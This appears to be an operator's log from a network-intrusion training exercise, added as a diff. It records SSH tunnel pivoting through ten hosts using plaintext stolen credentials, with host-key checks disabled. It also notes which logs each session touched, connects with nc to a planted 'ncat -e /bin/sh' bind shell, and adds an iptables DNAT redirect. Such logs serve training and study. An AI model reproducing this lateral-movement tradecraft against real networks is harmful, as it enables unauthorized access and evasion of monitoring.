@@ -1,0 +1,279 @@
+Date:2024-05-22 
+Start time: 0900
+End time: 1500
+
+------------------------
+SOM
+------------------------
+>T1: 10.50.34.234
+->T2: 10.20.169.122
+->T3: 10.20.169.10
+->T4: 10.20.169.13**
+->T5: 10.20.169.30
+-->T6: 10.20.169.239
+--->T7: 192.186.169.133*
+---->T8: 192.186.169.201
+----->T9: 129.168.169.186
+->T10: 10.20.169.121
+------------------------
+Creds
+------------------------
+engineer14::enshallah
+caisson14::tread_depth
+NOC_Admin14::AhmdLxu29D
+askar14::DaXedayLasarah
+=========================
+T1: >10.50.34.234
+=========================
+X-----------------------
+2024-05-22 09:02:45-- connection to T1; start vetting
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer14@10.50.34.234 -p 10123
+enshallah
+
+2024-05-22 09:03:33-- date
+Wed May 22 13:03:31 UTC 2024
+Wed May 22 13:03:31 UTC 2024
+
+udp         UNCONN      0.0.0.0:34039                       0.0.0.0:*            users:(("rsyslogd",pid=9052,fd=5))                             
+/var/log/audit/audit.log
+
+2024-05-22 09:09:09-- vetting complete-all clear; redirecting to T2
+2024-05-22 12:00:19-- start exit vetting
+2024-05-22 12:01:30-- exit vetting complete; disconnect from T1
+
+Logged In: utmp, wtmp, lastlog, messages, secure, audit.log
+------------------------X
+=========================
+
+=========================
+T2: ->10.20.169.122
+=========================
+X-----------------------
+2024-05-22 09:09:59-- connection to T2; start vetting
+ssh -S /tmp/T1 -O forward -L 127.0.0.1:2002:10.20.169.122:52203 dummy
+ssh -MS /tmp/T2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -p 2002
+tread_depth
+
+FA-16-3E-11-8A-8E
+10.20.169.122
+2024-05-22 09:10:52-- date
+Wed 05/22/2024
+01:10 PM
+
+2024-05-22 09:17:59-- vetting complete-all clear; start exit vetting
+
+2024-05-22 09:21:51-- exit vetting complete; disconnect from T2
+
+Logged In: No logs updated
+------------------------X
+=========================
+back to T1
+=========================
+T3: ->10.20.169.10
+=========================
+X-----------------------
+2024-05-22 09:22:37-- connection to T3; start vetting
+ssh -S /tmp/T1 -O forward -L 127.0.0.1:2003:10.20.169.10:52203 dummy
+ssh -MS /tmp/T3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -p 2003
+tread_depth
+
+FA-16-3E-E1-88-18
+10.20.169.10
+2024-05-22 09:23:18-- date
+Wed 05/22/2024
+01:23 PM
+administrator         console             1  Active      none   5/20/2024 12:21 PM
+baretail.exe                   788 Console                    1      9,452 K Unknown         CHATSERVER\Administrator                0:00:00 N/A
+C:\Users\Administrator\Downloads\baretail.exe  2768             788
+
+2024-05-22 09:34:33-- vetting complete; start exit vetting
+2024-05-22 09:36:44-- exit vetting complete; disconnect from T3
+
+Logged In: No logs updated
+------------------------X
+=========================
+back to T1
+=========================
+T5: ->10.20.169.30
+=========================
+X-----------------------
+2024-05-22 09:37:56-- connection to T5; start vetting
+ssh -S /tmp/T1 -O forward -L 127.0.0.1:2005:10.20.169.30:52203 dummy
+ssh -MS /tmp/T5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -p 2005
+tread_depth
+
+FA-16-3E-24-F8-3B
+10.20.169.30
+2024-05-22 09:41:32-- date
+Wed 05/22/2024
+01:41 PM
+administrator         console             1  Active      none   5/21/2024 12:02 PM
+
+2024-05-22 09:56:01-- vetting complete; redirecting to T6
+
+2024-05-22 11:22:26-- start exit vetting
+
+2024-05-22 11:24:27-- exit vetting complete; disconnect from T5
+
+Logged In: Security
+------------------------X
+=========================
+
+=========================
+T6: -->10.20.169.239
+=========================
+X-----------------------
+2024-05-22 09:56:58-- connection to T6; start vetting
+ssh -S /tmp/T5 -O forward -L 127.0.0.1:2006:10.20.169.239:52230 dummy
+ssh -MS /tmp/T6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin14@127.0.0.1 -p 2006
+AhmdLxu29D
+
+192.186.169.206//10.20.169.239
+radicle  tty1                      12:11    1:46m  0.10s  0.08s -vbash
+radicle  - tty1         May 22 12:11 01:46       20973
+2024-05-22 09:58:43-- date
+Wed May 22 13:58:39 UTC 2024
+Wed May 22 13:58:39 UTC 2024
+5 S root      3552     1  0  80   0 - 29938 ?      May09 ?        00:00:00   /usr/sbin/rsyslogd -c4
+-rw-rw-r--  1 root     utmp       71424 May 22 13:56 wtmp
+-rw-rw-r--  1 root     utmp      299300 May 22 13:56 lastlog
+-rw-r-----  1 root     adm       281538 May 22 14:01 auth.log
+
+2024-05-22 10:11:38-- vetting complete; redirecting to T7
+2024-05-22 11:20:30-- start exit vetting
+2024-05-22 11:21:57-- exit vetting complete; disconnect from T6
+
+Logged In: wtmp, utmp, lastlog, auth.log, messages
+-----------------------X
+=========================
+
+=========================
+T7: --->192.186.169.133*
+=========================
+X-----------------------
+2024-05-22 10:13:12-- connection to T7; start vetting
+ssh -S /tmp/T6 -O forward -L 127.0.0.1:2007:192.186.169.133:33517 dummy
+ssh -MS /tmp/T7 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -p 2007
+DaXedayLasarah
+
+10.101.169.38
+192.186.169.133
+2024-05-22 10:16:17-- date
+Wed May 22 14:15:33 UTC 2024
+Wed May 22 14:15:33 UTC 2024
+/root/Sup3rS3cr3t
+4 S root         896       1  0  80   0 - 60327 -      May09 ?        00:01:02   /usr/sbin/rsyslogd -n
+pacct
+/var/log/audit/audit.log
+
+2024-05-22 10:23:15-- vetting complete-nothing new; redirecting to T8
+2024-05-22 11:18:20-- start exit vetting
+2024-05-22 11:19:48-- exit vetting complete; disconnect from T7
+
+Logged In: wtmp, utmp, lastlog, messages, secure, pacct, audit.log
+-----------------------X
+=========================
+
+=========================
+T8:---->192.186.169.201
+=========================
+X-----------------------
+2024-05-22 10:25:25-- connection to T8; start vetting
+ssh -S /tmp/T7 -O forward -L 127.0.0.1:2008:192.186.169.201:44714 dummy
+nc -nv 127.0.0.1 2008
+
+root     tty1     -                13:07    1:17m  0.03s  0.01s -bash
+root     pts/0    192.186.169.133  13:08    1:10m  0.38s  0.08s -bash
+root     - tty1         2024-05-22 13:07 01:19        1481
+root     - pts/0        2024-05-22 13:08 01:11        1575 (192.186.169.133)
+sshed on from .133 over port 22
+2024-05-22 10:27:27-- date
+Wed May 22 14:27:24 UTC 2024
+Wed May 22 14:27:24 UTC 2024
+4 S root      1403     1  0  80   0 - 19692 -      13:04 tty1     00:00:00   /bin/login -p --
+4 S root      1481  1403  0  80   0 -  5783 -      13:07 tty1     00:00:00     -bash
+4 S root      1501  1296  0  80   0 - 26423 -      13:08 ?        00:00:00     sshd: root@pts/0
+4 S root      1575  1501  0  80   0 -  5812 -      13:08 pts/0    00:00:00       -bash
+0 S root      1601  1575  0  80   0 -   793 -      13:11 pts/0    00:00:00         /tmp/acpid
+4 S root      1635  1575  0  80   0 - 17075 -      13:13 pts/0    00:00:00         sudo -u askar1 ncat -knvlp 4471 -e /bin/sh
+
+tcp  ESTAB  0      0              192.186.169.201:55896       10.50.27.86:24682                                                                          tcp  ESTAB  0      0              192.186.169.201:22      192.186.169.133:33540                                                                                 
+-rw-r-----   1 syslog    adm              95282 May 22 14:47 auth.log
+/etc/rsyslog.d/50-default.conf
+*.* @@129.168.169.186:514
+
+2024-05-22 11:06:31-- vetting complete
+
+
+sudo iptables -L -t nat -n
+iptables -t nat -A PREROUTING -p tcp --dport 12314 -j DNAT --to-destination 129.168.169.186:33715
+sudo iptables -L -t nat -n
+
+2024-05-22 11:09:31-- start exit vetting
+2024-05-22 11:14:03-- exit vetting complete; disconnect from T8
+
+Logged In: auth.log
+-----------------------X
+=========================
+
+=========================
+T9: ----->129.168.169.186
+=========================
+X-----------------------
+No access
+ssh -S /tmp/T7 -O forward -L 127.0.0.1:12314:192.186.169.201:12314 dummy
+ssh -MS /tmp/T9 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -p 12314
+DaXedayLasarah
+
+
+
+
+
+
+
+
+------------------------X
+=========================
+T1-T10
+=========================
+T10: ->10.20.169.121
+=========================
+X-----------------------
+2024-05-22 11:26:09-- connection to T10; start vetting
+ssh -S /tmp/T1 -O forward -L 127.0.0.1:2010:10.20.169.121:52203 dummy
+ssh -MS /tmp/T10 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -p 2010
+tread_depth
+
+2024-05-22 11:27:55-- date
+Wed May 22 15:27:51 UTC 2024
+Wed May 22 15:27:51 UTC 2024
+
+4 S root       40304       1  0  80   0 - 77560 -      May09 ?        00:01:08   /usr/sbin/rsyslogd -n
+tcp    LISTEN   0.0.0.0:80   0.0.0.0:*      users:(("httpd",pid=53768,fd=3),("httpd",pid=53767,fd=3),("httpd",pid=53766,fd=3),("httpd",pid=39954,fd=3))  
+-rw-------.  1 root   root     56122 May 22 15:29 messages
+-rw-------.  1 root   root      6068 May 22 15:30 secure
+/var/log/audit/audit.log
+Current mode:                   enforcing
+/etc/rsyslog.conf
+*.* @@badguy:514
+10.111.23.4 badguy
+
+2024-05-22 11:43:47-- vetting complete; start survey
+2024-05-22 11:46:00-- survey complete
+
+
+2024-05-22 11:53:02-- rules added
+sudo iptables -A OUTPUT -p tcp --dport 1480 -j REJECT
+sudo iptables -A INPUT -p tcp --dport 1480 -j REJECT
+sudo iptables -L -t filter -n
+
+sudo iptables -D OUTPUT -p tcp --dport 1480 -j REJECT
+sudo iptables -D INPUT -p tcp --dport 1480 -j REJECT
+
+2024-05-22 11:54:55-- rules removed
+2024-05-22 11:57:55-- start exit vetting
+2024-05-22 11:59:22-- exit vetting complete; disconnect from T10
+
+Logged In: audit.log, messages, secure, lastlog, wtmp, utmp, rsyslog
+------------------------X
+=========================
